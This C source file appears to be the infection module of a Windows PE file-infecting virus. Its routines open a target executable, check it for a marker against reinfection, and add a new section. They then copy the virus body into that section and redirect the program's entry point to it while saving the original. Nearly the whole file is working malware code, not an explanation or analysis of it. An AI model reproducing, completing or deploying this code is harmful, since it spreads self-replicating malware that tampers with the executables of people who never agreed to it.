#include <stdint.h>
#include <windows.h>

#include "data.h"
#include "infect.h"
#include "oep.h"
#include "pe.h"
#include "utility.h"

typedef struct {
    HANDLE h_file;
    HANDLE h_map;
    void *start_address;
    DWORD size;
} file_view_t;

static int can_infect(const char *filename);
static void modify_headers(IMAGE_NT_HEADERS *nt_headers);
static void *copy_code(IMAGE_NT_HEADERS *nt_headers, file_view_t *file_view);
static void modify_entrypoint(IMAGE_NT_HEADERS *nt_headers,
                              uint32_t entry_offset, void *target_code_begin);
static uint32_t get_extended_file_size(const char *filename);
static int open_file_view(const char *filename, file_view_t *file_view);
static void close_file_view(file_view_t *file_view);

int infect(const char *filename, void *entry_function_addr) {
    if (can_infect(filename)) {
        file_view_t file_view;
        memzero(&file_view, sizeof(file_view_t));

        uint32_t extended_size = get_extended_file_size(filename);
        file_view.size = extended_size;
        if (open_file_view(filename, &file_view) == 0) {
            IMAGE_NT_HEADERS *nt_headers =
                get_nt_header(file_view.start_address);
            modify_headers(nt_headers);
            void *target_code_begin = copy_code(nt_headers, &file_view);
            uint32_t entry_offset =
                (uint32_t)BYTE_DIFF(entry_function_addr, code_begin);

            modify_entrypoint(nt_headers, entry_offset, target_code_begin);
            reset_data_pointer(target_code_begin);

            get_data()->function_list.flushViewOfFile(file_view.start_address,
                                                      extended_size);

            close_file_view(&file_view);
        } else {
            return 2;
        }
    } else {
        return 1;
    }
    return 0;
}

static void modify_headers(IMAGE_NT_HEADERS *nt_headers) {
    create_section_header(get_last_section_header(nt_headers) + 1, nt_headers,
                          CODE_SIZE);
    IMAGE_SECTION_HEADER *new_sector = get_last_section_header(nt_headers);

    nt_headers->FileHeader.TimeDateStamp = INFECTION_MARKER;
    // original sizes are already aligned, so add only aligned increase (and not
    // align(orig + inc))
    // nt_headers->OptionalHeader.SizeOfCode += align_value(code_size,
    // nt_headers->OptionalHeader.FileAlignment);
    nt_headers->OptionalHeader.SizeOfCode +=
        align_value(CODE_SIZE, nt_headers->OptionalHeader.FileAlignment);
    if (nt_headers->OptionalHeader.SizeOfCode <
        new_sector->PointerToRawData + new_sector->SizeOfRawData -
            nt_headers->OptionalHeader.BaseOfCode) {
        nt_headers->OptionalHeader.SizeOfCode = align_value(
            new_sector->PointerToRawData + new_sector->SizeOfRawData -
                nt_headers->OptionalHeader.BaseOfCode,
            nt_headers->OptionalHeader.FileAlignment);
    }
    nt_headers->OptionalHeader.SizeOfImage +=
        align_value(CODE_SIZE + sizeof(IMAGE_SECTION_HEADER),
                    nt_headers->OptionalHeader.SectionAlignment);
    nt_headers->OptionalHeader.SizeOfHeaders += align_value(
        sizeof(IMAGE_SECTION_HEADER), nt_headers->OptionalHeader.FileAlignment);
}

static void *copy_code(IMAGE_NT_HEADERS *nt_headers, file_view_t *file_view) {
    IMAGE_SECTION_HEADER *section_header = get_last_section_header(nt_headers);
    void *target_code_begin =
        BYTE_OFFSET(file_view->start_address, section_header->PointerToRawData);
    memcp(BYTE_OFFSET(code_begin, get_data()->delta_offset), target_code_begin,
          CODE_SIZE);
    return target_code_begin;
}

// virus code must already been copied to target file!
static void modify_entrypoint(IMAGE_NT_HEADERS *nt_headers,
                              uint32_t entry_offset, void *target_code_begin) {
    uint32_t oep = nt_headers->OptionalHeader.ImageBase +
                   nt_headers->OptionalHeader.AddressOfEntryPoint;
    if (write_original_entry_point(oep, target_code_begin) != 0) {
        PRINT_DEBUG("could not save original entry point");
    }

    IMAGE_SECTION_HEADER *section_header = get_last_section_header(nt_headers);
    nt_headers->OptionalHeader.AddressOfEntryPoint =
        section_header->VirtualAddress + entry_offset;
}

static int can_infect(const char *filename) {
    file_view_t fw;
    memzero(&fw, sizeof(file_view_t));

    if (open_file_view(filename, &fw) != 0) {
        PRINT_DEBUG("can't infect \"%s\": could not open file", filename);
        return 0;
    }

    if (!is_pe(fw.start_address)) {
        PRINT_DEBUG("can't infect \"%s\": no valid pe", filename);
        close_file_view(&fw);
        return 0;
    }

    IMAGE_NT_HEADERS *nt_headers = get_nt_header(fw.start_address);
    IMAGE_SECTION_HEADER *section_header =
        get_section_header(nt_headers, nt_headers->FileHeader.NumberOfSections);

    if (!is_section_header_empty(section_header)) {
        PRINT_DEBUG("can't infect \"%s\": no additional empty section header",
                    filename);
        close_file_view(&fw);
        return 0;
    }
    if (nt_headers->FileHeader.TimeDateStamp == INFECTION_MARKER) {
        PRINT_DEBUG("can't infect \"%s\": already infected", filename);
        close_file_view(&fw);
        return 0;
    }
    close_file_view(&fw);
    return 1;
}

static uint32_t get_extended_file_size(const char *filename) {
    file_view_t fw;
    memzero(&fw, sizeof(file_view_t));

    if (open_file_view(filename, &fw) != 0) {
        PRINT_DEBUG("could not open view of file");
        return 0;
    }
    IMAGE_NT_HEADERS *nt_headers = get_nt_header(fw.start_address);
    uint32_t extended_size =
        fw.size + nt_headers->OptionalHeader.FileAlignment +
        align_value(CODE_SIZE, nt_headers->OptionalHeader.FileAlignment);
    close_file_view(&fw);
    return extended_size;
}

static int open_file_view(const char *filename, file_view_t *file_view) {
    data_t *data = get_data();

    if (data == NULL) {
        PRINT_DEBUG("could not get data");
        return -1;
    }

    file_view->h_file = data->function_list.create_file_a(
        filename, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (file_view->h_file == INVALID_HANDLE_VALUE) {
        return 1;
    }

    if (file_view->size == 0) {
        file_view->size =
            (DWORD)data->function_list.get_file_size(file_view->h_file, NULL);
        if (file_view->size == INVALID_FILE_SIZE) {
            data->function_list.close_handle(file_view->h_file);
            return 2;
        }
    }

    file_view->h_map = data->function_list.create_file_mapping_a(
        file_view->h_file, NULL, PAGE_READWRITE, 0, file_view->size, NULL);

    if (file_view->h_map == NULL) {
        data->function_list.close_handle(file_view->h_file);
        return 3;
    }

    file_view->start_address = (void *)data->function_list.map_view_of_file(
        file_view->h_map, FILE_MAP_ALL_ACCESS, 0, 0, file_view->size);

    if (file_view->start_address == NULL) {
        data->function_list.close_handle(file_view->h_map);
        data->function_list.close_handle(file_view->h_file);
        return 4;
    }
    return 0;
}

static void close_file_view(file_view_t *file_view) {
    data_t *data = get_data();
    if (data != NULL) {
        data->function_list.unmap_view_of_file(
            (LPCVOID)file_view->start_address);
        data->function_list.close_handle(file_view->h_map);
        data->function_list.close_handle(file_view->h_file);
    } else {
        PRINT_DEBUG("could not get data");
    }
    memzero(file_view, sizeof(file_view_t));
}
